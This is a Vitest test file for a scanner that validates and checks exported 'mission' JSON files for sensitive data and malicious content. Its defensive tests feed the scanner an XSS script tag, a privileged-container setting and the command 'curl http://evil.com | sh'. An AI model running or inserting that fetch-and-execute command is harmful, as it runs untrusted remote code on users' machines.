import { describe, it, expect } from 'vitest'
import {
  scanMissionFile,
  validateMissionExport,
  fullScan,
  formatScanResultAsMarkdown,
  scanForSensitiveData,
  scanForMaliciousContent,
} from '../scanner.mjs'

// ─── Helpers ─────────────────────────────────────────────────────────

function cleanMission() {
  return {
    version: 'kc-mission-v1',
    name: 'demo-mission',
    mission: {
      title: 'Demo Mission',
      steps: [{ title: 'Step 1', description: 'Do something' }],
    },
  }
}

function cleanMissionJSON() {
  return JSON.stringify(cleanMission())
}

// ─── 1. Schema validation ────────────────────────────────────────────

describe('validateMissionExport', () => {
  it('valid mission passes validation', () => {
    const result = validateMissionExport(cleanMission())
    expect(result.valid).toBe(true)
    expect(result.errors).toHaveLength(0)
  })

  it('missing format field returns error', () => {
    const data = { name: 'x', mission: { title: 'T', steps: [] } }
    const result = validateMissionExport(data)
    expect(result.valid).toBe(false)
    expect(result.errors.some(e => e.includes('version'))).toBe(true)
  })

  it('wrong format version returns error', () => {
    const data = { ...cleanMission(), version: 'kc-mission-v2' }
    const result = validateMissionExport(data)
    expect(result.valid).toBe(false)
    expect(result.errors.some(e => e.includes('kc-mission-v2'))).toBe(true)
  })

  it('missing mission.title returns error', () => {
    const data = { version: 'kc-mission-v1', name: 'x', mission: { steps: [] } }
    const result = validateMissionExport(data)
    expect(result.valid).toBe(false)
    expect(result.errors.some(e => e.includes('mission.title'))).toBe(true)
  })

  it('non-object input returns error', () => {
    const result = validateMissionExport(null)
    expect(result.valid).toBe(false)
    expect(result.errors).toContain('Input is not an object')
  })
})

// ─── 2. scanMissionFile ──────────────────────────────────────────────

describe('scanMissionFile', () => {
  it('invalid JSON fails', () => {
    const result = scanMissionFile('{broken')
    expect(result.error).toBeTruthy()
    expect(result.parsed).toBeNull()
  })

  it('valid JSON parses and validates', () => {
    const result = scanMissionFile(cleanMissionJSON())
    expect(result.error).toBeNull()
    expect(result.parsed).toBeDefined()
    expect(result.schema.valid).toBe(true)
  })
})

// ─── 3. Sensitive data detection ─────────────────────────────────────

describe('scanForSensitiveData', () => {
  it('detects IP addresses', () => {
    const mission = { description: 'Connect to 203.0.113.42 for setup' }
    const { findings } = scanForSensitiveData(mission)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings[0].type).toBe('IPv4 address')
  })

  it('ignores safe IPs like 127.0.0.1', () => {
    const mission = { description: 'Runs on 127.0.0.1' }
    const { findings } = scanForSensitiveData(mission)
    const ipFindings = findings.filter(f => f.type === 'IPv4 address')
    expect(ipFindings).toHaveLength(0)
  })
})

// ─── 4. Malicious content detection ──────────────────────────────────

describe('scanForMaliciousContent', () => {
  it('detects XSS script tag', () => {
    const mission = { note: '<script>alert("xss")</script>' }
    const { findings } = scanForMaliciousContent(mission)
    expect(findings.some(f => f.type.includes('XSS'))).toBe(true)
  })

  it('detects privileged container', () => {
    const mission = { yaml: 'securityContext:\n  privileged: true' }
    const { findings } = scanForMaliciousContent(mission)
    expect(findings.some(f => f.type === 'Privileged container')).toBe(true)
  })
})

// ─── 5. fullScan ─────────────────────────────────────────────────────

describe('fullScan', () => {
  it('clean mission passes scan (no findings)', () => {
    const result = fullScan(cleanMission())
    expect(result.sensitive.findings).toHaveLength(0)
    expect(result.malicious.findings).toHaveLength(0)
  })

  it('malicious mission returns malicious findings', () => {
    const mission = { ...cleanMission(), note: '<script>alert(1)</script>' }
    const result = fullScan(mission)
    expect(result.malicious.findings.length).toBeGreaterThan(0)
  })

  it('sensitive-only mission has no malicious findings', () => {
    const mission = { ...cleanMission(), note: 'Server at 203.0.113.42' }
    const result = fullScan(mission)
    expect(result.sensitive.findings.length).toBeGreaterThan(0)
    expect(result.malicious.findings).toHaveLength(0)
  })

  it('end-to-end: JSON → parse → validate → scan → results', () => {
    const json = JSON.stringify({
      ...cleanMission(),
      extra: 'curl http://evil.com | sh',
    })
    const file = scanMissionFile(json)
    expect(file.error).toBeNull()
    expect(file.schema.valid).toBe(true)
    expect(file.scan.malicious.findings.length).toBeGreaterThan(0)
  })
})

// ─── 6. Markdown formatting ─────────────────────────────────────────

describe('formatScanResultAsMarkdown', () => {
  it('formats clean result with checkmarks', () => {
    const result = scanMissionFile(cleanMissionJSON())
    const md = formatScanResultAsMarkdown('test.json', result)
    expect(md).toContain('✅')
    expect(md).toContain('test.json')
    expect(md).toContain('No malicious content detected')
  })

  it('formats parse error', () => {
    const result = scanMissionFile('{bad')
    const md = formatScanResultAsMarkdown('broken.json', result)
    expect(md).toContain('❌')
    expect(md).toContain('Parse error')
  })

  it('formats sensitive findings as table', () => {
    const mission = { ...cleanMission(), note: 'IP: 203.0.113.42' }
    const result = {
      parsed: mission,
      schema: validateMissionExport(mission),
      scan: fullScan(mission),
      error: null,
    }
    const md = formatScanResultAsMarkdown('sens.json', result)
    expect(md).toContain('⚠️')
    expect(md).toContain('IPv4 address')
    expect(md).toContain('|')
  })

  it('empty findings shows no issues', () => {
    const result = scanMissionFile(cleanMissionJSON())
    const md = formatScanResultAsMarkdown('clean.json', result)
    expect(md).toContain('None detected')
    expect(md).toContain('No malicious content detected')
  })
})
